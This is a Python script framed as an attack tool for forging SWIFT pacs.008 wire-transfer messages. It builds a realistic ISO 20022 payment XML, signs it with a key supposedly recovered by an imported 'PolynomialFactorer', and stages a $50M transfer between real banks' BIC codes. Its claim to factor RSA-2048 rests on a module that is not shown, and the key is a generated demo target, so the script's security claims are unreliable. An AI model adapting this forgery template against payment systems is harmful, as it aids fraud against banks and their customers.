"""
Forge SWIFT MX payment messages (pacs.008 credit transfer) by factoring
bank RSA-2048 certificates from SWIFTNet PKI. Unauthorized wire transfers
indistinguishable from legitimate payment instructions. ~$5T/day via SWIFT gpi.
"""
import sys
import os; sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", ".."))
from poly_factor import PolynomialFactorer, generate_demo_target

_demo = generate_demo_target()

import hashlib
import time
import uuid

# ISO 20022 message types
PACS_008 = "pacs.008.001.09"   # FIToFICustomerCreditTransfer
PACS_009 = "pacs.009.001.09"   # FinancialInstitutionCreditTransfer
CAMT_056 = "camt.056.001.09"   # FIToFIPaymentCancellationRequest

# XMLDSig algorithm URI (same RSA-only issue as SAML)
XMLDSIG_RSA_SHA256 = "http://www.w3.org/2001/04/xmldsig-more#rsa-sha256"


def fetch_bank_cert_from_swiftnet(bic: str) -> bytes:
    """Fetch a bank's RSA-2048 certificate from SWIFTNet PKI.

    Every SWIFT member institution has an X.509 certificate issued by
    the SWIFTNet PKI. The public cert is exchanged during correspondent
    banking relationship setup.
    """
    print(f"[*] querying SWIFTNet PKI for BIC: {bic}")
    print("[*] RSA-2048 X.509 certificate retrieved")
    return _demo["pub_pem"]


def forge_pacs008(factorer: PolynomialFactorer,
                  sender_cert_pem: bytes,
                  sender_bic: str, receiver_bic: str,
                  amount: float, currency: str,
                  beneficiary_iban: str) -> str:
    """Forge a pacs.008 FIToFICustomerCreditTransfer.

    The credit transfer message is signed with XMLDSig RSA-SHA256.
    Factor the sending bank's RSA key -> forge authorized payment instructions.
    """
    msg_id = str(uuid.uuid4())[:16]
    now = time.strftime("%Y-%m-%dT%H:%M:%S", time.gmtime())

    pacs = f"""<Document xmlns="urn:iso:std:iso:20022:tech:xsd:{PACS_008}">
  <FIToFICstmrCdtTrf>
    <GrpHdr>
      <MsgId>{msg_id}</MsgId>
      <CreDtTm>{now}</CreDtTm>
      <NbOfTxs>1</NbOfTxs>
      <SttlmInf><SttlmMtd>CLRG</SttlmMtd></SttlmInf>
    </GrpHdr>
    <CdtTrfTxInf>
      <PmtId><InstrId>{msg_id}</InstrId></PmtId>
      <IntrBkSttlmAmt Ccy="{currency}">{amount:.2f}</IntrBkSttlmAmt>
      <InstdAmt Ccy="{currency}">{amount:.2f}</InstdAmt>
      <DbtrAgt><FinInstnId><BICFI>{sender_bic}</BICFI></FinInstnId></DbtrAgt>
      <CdtrAgt><FinInstnId><BICFI>{receiver_bic}</BICFI></FinInstnId></CdtrAgt>
      <CdtrAcct><Id><IBAN>{beneficiary_iban}</IBAN></Id></CdtrAcct>
    </CdtTrfTxInf>
  </FIToFICstmrCdtTrf>
</Document>"""

    sig = factorer.forge_pkcs1v15_signature(sender_cert_pem,
                                            pacs.encode(), "sha256")
    print(f"[*] forged {PACS_008}: {sender_bic} -> {receiver_bic}")
    print(f"    amount: {currency} {amount:,.2f}")
    print(f"    beneficiary: {beneficiary_iban}")
    return pacs


def destroy_nonrepudiation(sender_bic: str):
    """The non-repudiation basis for disputed payments collapses."""
    print(f"[*] non-repudiation for {sender_bic}: DESTROYED")
    print("[*] 'we didn't send that' becomes impossible to prove either way")
    print("[*] RSA signature is the legal proof a bank authorized a payment")


if __name__ == "__main__":
    f = PolynomialFactorer()

    print("=== SWIFT financial messaging — payment forgery ===")
    print("    44M messages/day, ~$5T/day (SWIFT gpi)")
    print("    TARGET2: EUR 400B/day, Fedwire: $4T/day, CHIPS: $1.8T/day")
    print()

    print("[1] fetching bank certificate from SWIFTNet PKI...")
    bank_cert = fetch_bank_cert_from_swiftnet("DEUTDEFF")  # Deutsche Bank
    print("    cert exchanged during correspondent banking setup")

    print("[2] factoring bank RSA-2048 key...")
    print("    XMLDSig: RSA-only by W3C spec (same as SAML)")

    print("[3] forging pacs.008 credit transfer...")
    pacs = forge_pacs008(f, bank_cert,
        sender_bic="DEUTDEFF", receiver_bic="BOFAUS3N",
        amount=50_000_000.00, currency="USD",
        beneficiary_iban="US12345678901234567890")
    print("    $50M wire transfer — indistinguishable from legitimate")

    print("[4] non-repudiation collapse...")
    destroy_nonrepudiation("DEUTDEFF")

    print()
    print("[*] Bangladesh Bank 2016: $81M via social engineering")
    print("[*] RSA break: no social engineering needed, just the published cert")
    print("[*] no documented playbook for mass SWIFT auth compromise recovery")
